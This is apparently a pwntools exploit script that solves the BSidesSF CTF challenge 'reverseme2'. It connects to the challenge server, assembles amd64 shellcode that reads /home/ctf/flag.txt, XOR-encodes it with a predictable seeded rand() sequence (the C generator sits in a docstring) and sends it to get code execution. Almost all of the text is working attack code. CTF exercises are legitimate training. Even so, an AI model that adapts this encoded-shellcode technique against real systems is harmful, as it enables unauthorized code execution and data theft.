#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('reverseme2')
context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef\nhandle SIGALRM ignore')

# pause()
p = remote('reverseme2-24b392b5.challenges.bsidessf.net', 1339)

shellcode = bytearray(asm(shellcraft.amd64.linux.cat("/home/ctf/flag.txt")))

"""
#include <stdio.h>
#include <stdlib.h>


int main(void) {
    srand(0x13371337u);
    for (int i = 0; i < 63; ++i) {
        printf("%d\n", (rand() >> 3) & 0xff);
    }
    return 0;
}
"""

randoms = list(map(int, subprocess.check_output("./randoms").splitlines()))

for i in range(len(shellcode)):
    shellcode[i] ^= randoms[i]

p.sendlineafter("Send me (encoded) x64!!\n", str(shellcode))



p.interactive()
